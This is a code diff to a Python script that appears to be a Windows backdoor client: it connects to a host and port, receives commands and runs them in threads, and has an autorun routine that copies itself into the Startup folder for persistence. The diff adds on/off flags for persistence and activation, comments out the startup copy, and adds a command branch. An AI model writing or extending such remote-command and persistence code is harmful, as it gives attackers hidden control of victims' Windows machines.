@@ -3,6 +3,12 @@ import time
 import subprocess
 import threading
 import os
+import sys
+import winreg as reg
+
+
+PERSIST = False
+ACTIVATE = False
 
 HOST = "127.0.0.1"
 PORT = 554
@@ -10,10 +16,11 @@ PORT = 554
 
 # noinspection StandardShellInjection
 def autorun():
-    filename = os.path.basename(__file__)
-    exe_filename = filename.replace(".py", ".exe")
+    filename = os.path.basename(sys.argv[0])
+    # exe_filename = filename.replace(".py", ".exe")
     try:
-        os.system("copy {} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"".format(exe_filename))
+        print(filename)
+        # os.system("copy {} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"".format(filename))
     except Exception as e:
         print(e)
         
@@ -51,6 +58,8 @@ def listen(client):
             if data == "/exit":
                 client.close()
                 break
+            elif data == "/print":
+                pass
             else:
                 t = threading.Thread(target=cmd, args=(client, data))
                 t.start()
@@ -61,9 +70,12 @@ def listen(client):
 
 
 if __name__ == "__main__":
-    # autorun()
+    if PERSIST is True:
+        autorun()
+
     time.sleep(2)
-    while True:
+
+    while ACTIVATE:
         client_ = connect(HOST, PORT)
         if client_:
             listen(client_)
